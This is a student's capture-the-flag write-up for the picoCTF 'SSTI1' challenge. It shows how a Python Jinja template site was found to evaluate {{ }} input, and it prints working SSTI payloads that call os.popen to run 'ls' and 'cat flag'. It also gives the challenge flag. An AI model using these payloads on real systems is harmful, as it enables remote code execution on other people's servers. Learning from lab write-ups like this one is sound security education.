# **WEB EXP**
## **<ins>SSTI1</ins>**
### CHALLENGE DESCRIPTION:
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!


By entering regular texts like 'HI' the website echos these commands as it is.
<img width="452" height="126" alt="image" src="https://github.com/user-attachments/assets/ce56e69e-df8d-4a13-a5f6-edd299db3894" />
<img width="458" height="179" alt="image" src="https://github.com/user-attachments/assets/55d782d1-d084-4a79-83c6-8eb34f370607" />

By entering commands in {{ }} the website executes commands inside the paranthesis.
<img width="447" height="119" alt="image" src="https://github.com/user-attachments/assets/47cc0647-f866-4c6b-ace8-a0376804fd62" />
<img width="243" height="147" alt="image" src="https://github.com/user-attachments/assets/af5ffe0a-0b2c-4f4e-9fe5-42169ca13e6a" />

Hence the {{ }} executes commands and does not just print them. 
Using the command
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```
we get the flag.
We get the above command using server side template injection.
This website is run by python and hence by looking up for python server side template injection RCE (remote code execution).
We learn about jinja which is an engine for python programming.
Then after looking up python SSTI RCE I found a code that remotely executes the id command.
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
```
But when this command is entered in the website nothing is displayed.
When we enter id inside the bracket and execute the command. We get an error.
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(id).read()}}
```
<img width="1069" height="97" alt="image" src="https://github.com/user-attachments/assets/ce3621df-4f38-4acb-8168-634f3ac8bc07" />

Now if we try the ls command instead.
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}
```

<img width="1189" height="235" alt="image" src="https://github.com/user-attachments/assets/23070eda-3d00-4f94-914d-a0e883150d6a" />
Hence the flag file is in this directory.
Now we can read the flag file by using the cat command.
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}
```
We obtain the flag.


### SOLVE: 
***FLAG:***:  picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}

## Concepts learnt:
I learnt about server side template injection and RCE.

